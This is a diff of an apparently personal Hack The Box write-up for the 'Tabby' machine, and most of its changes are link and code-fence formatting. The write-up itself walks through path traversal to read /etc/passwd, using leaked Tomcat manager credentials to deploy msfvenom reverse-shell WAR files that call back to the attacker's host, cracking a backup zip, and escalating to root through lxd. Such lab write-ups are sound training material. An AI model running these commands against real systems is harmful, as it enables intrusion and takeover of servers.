@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/8c6ba046952fa8ee8475f7081afffe3e60250fd9/linux-machines/easy/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,11 +10,11 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -22,7 +22,7 @@ Short description to include any strange things to be dealt with
 
 I started my enumeration with an nmap scan of `10.10.10.194`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ sudo nmap -sSCV -p- -n -v -oA tabby 10.10.10.194
 [sudo] password for zweilos: 
@@ -87,27 +87,23 @@ Nmap done: 1 IP address (1 host up) scanned in 86.69 seconds
 
 /var/lib/tomcat9/webapps/ROOT/index.html
 
-
-http://megahosting.htb/news.php?file=statement
+[http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement)
 
 added megahosting.htb to hosts file
 
 > We have recently upgraded several services. Our servers are now more secure than ever. Read our statement on recovering from the data breach
 
-recently had a breach of some sort
-http://megahosting.htb/news.php?file=statement
-replaced 'statement' with ../../../../etc/passwd and got the file
+recently had a breach of some sort [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement) replaced 'statement' with ../../../../etc/passwd and got the file
 
 found username `ash`
 
-http://10.10.10.194:8080/docs/host-manager-howto.html
+[http://10.10.10.194:8080/docs/host-manager-howto.html](http://10.10.10.194:8080/docs/host-manager-howto.html)
 
-`<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script">
-</user>`
+`<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"> </user>`
 
 how to use curl to send package to server
 
-```
+```text
 Add command
 
 Use the add command to add a new virtual host. Parameters used for the add command:
@@ -128,13 +124,11 @@ curl -u test:test http://localhost:8080/host-manager/text/add?name=www.awesomese
 Example response:
 
 add: Adding host [www.awesomeserver.com]
-
-
 ```
 
-https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/
+[https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.216 LPORT=12543 -f war -o CRash.war
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -147,7 +141,7 @@ Saved as: CRash.war
 
 in msfconsole
 
-```
+```text
 msf5 exploit(multi/handler) > set lhost tun0
 lhost => tun0
 msf5 exploit(multi/handler) > set lport 12543
@@ -163,7 +157,7 @@ msf5 exploit(multi/handler) > run
 
 started my handler in msfconsole
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ curl -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/host-manager/html/add?name=test&aliases=test&appBase=http://10.10.14.216:8099/CRash.war&deployOnStartup=true"
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
@@ -188,15 +182,15 @@ started my handler in msfconsole
     By default the Host Manager is only accessible from a browser running on the
     same machine as Tomcat. If you wish to modify this restriction, you'll need
     to edit the Host Manager's <tt>context.xml</tt> file.
-
 ```
+
 upload did not work as in the Windows example, kept reading in the documentation, and found a way to deply directly, without adding first
 
-http://10.10.10.194:8080/docs/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely
+[http://10.10.10.194:8080/docs/manager-howto.html\#Deploy\_A\_New\_Application\_Archive\_\(WAR\)\_Remotely](http://10.10.10.194:8080/docs/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely)
 
 In order to send the file
 
-```
+```text
 -T, --upload-file <file>
               This transfers the specified local file to the remote URL. If there is no file part  in
               the  specified  URL,  curl  will  append  the local file name. NOTE that you must use a
@@ -208,15 +202,15 @@ In order to send the file
 
 I checked the man page for the correct options and found `-T`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ curl -u 'tomcat:$3cureP4s5w0rd123!' -T CRash.war http://megahosting.htb:8080/manager/text/deploy?path=/CRash   
 OK - Deployed application at context path [/CRash]
 ```
 
-after troublehsooting...I realized that my payload was set to be run in the context of a linux machine, however, this was being run as a java file (after the .war was unpacked, running on the web server) sop I changed my payload and tried again
+after troublehsooting...I realized that my payload was set to be run in the context of a linux machine, however, this was being run as a java file \(after the .war was unpacked, running on the web server\) sop I changed my payload and tried again
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.216 LPORT=12543 -f war -o CRash.war       1 ⨯
 Payload size: 1084 bytes
@@ -224,19 +218,18 @@ Final size of war file: 1084 bytes
 Saved as: CRash.war
 ```
 
-next I uploaded the new version (had to change the name since the old one still existed)
+next I uploaded the new version \(had to change the name since the old one still existed\)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ curl http://10.10.10.194:8080/CRash2/
 ```
 
-Then I activated my reverse shell by curling the url [make sure to put the trailing `/`, it looks like it is doing something, but will give no output and wont work without it!!]
-
+Then I activated my reverse shell by curling the url \[make sure to put the trailing `/`, it looks like it is doing something, but will give no output and wont work without it!!\]
 
 ## Initial Foothold
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ nc -lvnp 12543
 listening on [any] 12543 ...
@@ -245,10 +238,10 @@ which python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@tabby:/var/lib/tomcat9$ ^Z
 zsh: suspended  nc -lvnp 12543
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ stty raw -echo                                                                            148 ⨯ 1 ⚙
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/tabby]
                                    └─$                                                                  fg                        
 [1]  + continued  nc -lvnp 12543
@@ -257,7 +250,7 @@ zsh: suspended  nc -lvnp 12543
 
 I got a shell back on my nc listener, and attempted to upgrade my shell using python
 
-```
+```text
 [*] Started reverse TCP handler on 10.10.14.216:12543 
 [*] Command shell session 1 opened (10.10.14.216:12543 -> 10.10.10.194:53774) at 2020-10-12 15:00:22 -0400
 
@@ -284,13 +277,13 @@ msf5 exploit(multi/handler) > sessions 2
 meterpreter >
 ```
 
-setting stty raw -echo broke my nc shell, so I switched to msfconsole (I think I may have had this problem with zsh before, will have to try with bash and see if it works properly)
+setting stty raw -echo broke my nc shell, so I switched to msfconsole \(I think I may have had this problem with zsh before, will have to try with bash and see if it works properly\)
 
 ## Road to User
 
 ### Further enumeration
 
-```
+```text
 meterpreter > shell
 Process 8691 created.
 Channel 3 created.
@@ -335,7 +328,7 @@ drwxr-x---  4 tomcat tomcat 4096 Oct 12 17:24 shell_m
 
 shsjks
 
-```
+```text
 zweilos@kali:~/htb/tabby$ nc -lvnp 12543
 listening on [any] 12543 ...
 connect to [10.10.14.216] from (UNKNOWN) [10.10.10.194] 53782
@@ -351,7 +344,7 @@ tomcat@tabby:/var/lib/tomcat9$ clear
 
 I got annoyed at the lack of tab completion and other niceties so I tried backing out and starting my nc listener from bash, and was able to set raw stty with no problem
 
-```
+```text
 tomcat@tabby:/var/www/html/files$ ls -la
 total 36
 drwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 .
@@ -364,7 +357,7 @@ drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
 
 in the /var/www/html/files folder I found some backup files
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ unzip 16162020_backup.zip 
 Archive:  16162020_backup.zip
@@ -375,7 +368,7 @@ password incorrect--reenter:
 
 exfiltrated the backup zip to my machine and tried to open it, but it was password protected
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ zip2john 16162020_backup.zip > ziphash
 16162020_backup.zip/var/www/html/assets/ is not encrypted!
@@ -393,7 +386,7 @@ option -o to pick a file at a time.
 
 I tried using zip2john to extract the zip hash for cracking, and got a message that some of the files might not be encrypted\
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ hashcat --help | grep -i pkzip                                     
   17200 | PKZIP (Compressed)                               | Archives
@@ -404,10 +397,10 @@ I tried using zip2john to extract the zip hash for cracking, and got a message t
   20500 | PKZIP Master Key                                 | Archives
   20510 | PKZIP Master Key (6 byte optimization)           | Archives
 ```
-  
+
 checked hashcat's help to see which filetype to use
-  
-```
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ hashcat -O -D1,2 -a0 -m17225 --username ziphash /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
@@ -433,7 +426,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 $pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$:admin@it
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: PKZIP (Mixed Multi-File Checksum-Only)
@@ -456,7 +449,7 @@ Stopped: Mon Oct 12 15:51:16 2020
 
 it took only a few secs to crack the password, which was `admin@it`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ unzip 16162020_backup.zip
 Archive:  16162020_backup.zip
@@ -468,16 +461,14 @@ Archive:  16162020_backup.zip
   inflating: var/www/html/news.php   
   inflating: var/www/html/Readme.txt
 ```
-  
-The index.php file seems nearly identical to the one currently hosted...except for the email address sales@digitallandscape.com and other references to the name Digital Landscapes. It seems like the company did some rebranding recently.  
 
+The index.php file seems nearly identical to the one currently hosted...except for the email address sales@digitallandscape.com and other references to the name Digital Landscapes. It seems like the company did some rebranding recently.
 
 ### Finding user creds
 
-
 ### User.txt
 
-```
+```text
 tomcat@tabby:/var/www/html/files$ su ash 
 Password: 
 ash@tabby:/var/www/html/files$ cd ~
@@ -504,7 +495,7 @@ The zip file seemed to be a dead-end, so I decided to try to use the password I 
 
 ### Enumeration as User `ash`
 
-```
+```text
 ash@tabby:~$ sudo -l
 sudo: unable to open /run/sudo/ts/ash: Read-only file system
 [sudo] password for ash: 
@@ -513,23 +504,23 @@ Sorry, user ash may not run sudo on tabby.
 
 wierd error while trying to check sudo permissions
 
-```
+```text
 ash@tabby:/dev/shm$ id
 uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
 ```
 
 plugdev and lxd sound interesting
 
-```
+```text
 ash@tabby:/dev/shm$ uname -a
 Linux tabby 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
 ### Getting a shell
 
-https://shenaniganslabs.io/2019/05/21/LXD-LPE.html
+[https://shenaniganslabs.io/2019/05/21/LXD-LPE.html](https://shenaniganslabs.io/2019/05/21/LXD-LPE.html)
 
-```
+```text
 ash@tabby:/dev/shm$ lxd
 Error: This must be run as root
 ash@tabby:/dev/shm$ sudo lxd init
@@ -568,10 +559,9 @@ ash@tabby:/dev/shm$ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::d4e6:3dff:feb8:e9eb/64 scope link 
        valid_lft forever preferred_lft forever
-
 ```
 
-```
+```text
 ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20201012_2205.tar.gz --alias test
 Error: Image with same fingerprint already exists
 
@@ -596,16 +586,15 @@ ash@tabby:/dev/shm$ lxc image ls
 +-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
 | s     | e69ffcf64dfc | no     | alpine v3.12 (20201012_22:05) | x86_64       | CONTAINER | 3.05MB | Oct 12, 2020 at 9:37pm (UTC) |
 +-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
-
 ```
 
 apparently I was not the only one working one this particular machine...
 
 ### Root.txt
 
-https://www.hackingarticles.in/lxd-privilege-escalation/
+[https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
 
-```
+```text
 ash@tabby:/dev/shm$ lxc exec privesc ash
 ~ # id
 uid=0(root) gid=0(root)
@@ -625,9 +614,9 @@ root.txt  snap
 2d8c7388853dadce25e4605460167ab1
 ```
 
-Even though I had the root flag, I was not convinced that I had actually owned the machine, 
+Even though I had the root flag, I was not convinced that I had actually owned the machine,
 
-```
+```text
 /mnt/root/root # ls -la
 total 40
 drwx------    6 root     root          4096 Jun 16 13:59 .
@@ -651,7 +640,7 @@ MGa/fifvqNppFIRSbS10PhTojw0= zweilos@kali' >> authorized_keys
 
 so I tried to add my public key and ssh in
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/tabby]
 └─$ ssh -i ash.key root@10.10.10.194        
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)
@@ -690,7 +679,7 @@ uid=0(root) gid=0(root) groups=0(root)
 tabby
 ```
 
-now I was happy and satisfied that I had truly owned the machine.  I was still not entirely happy with how easy the root privesc was, but it was a good learning experience to know to secure members of the `lxd` group!
+now I was happy and satisfied that I had truly owned the machine. I was still not entirely happy with how easy the root privesc was, but it was a good learning experience to know to secure members of the `lxd` group!
 
 Thanks to [`egre55`](https://app.hackthebox.eu/users/1190) for something interesting or useful about this machine.
 
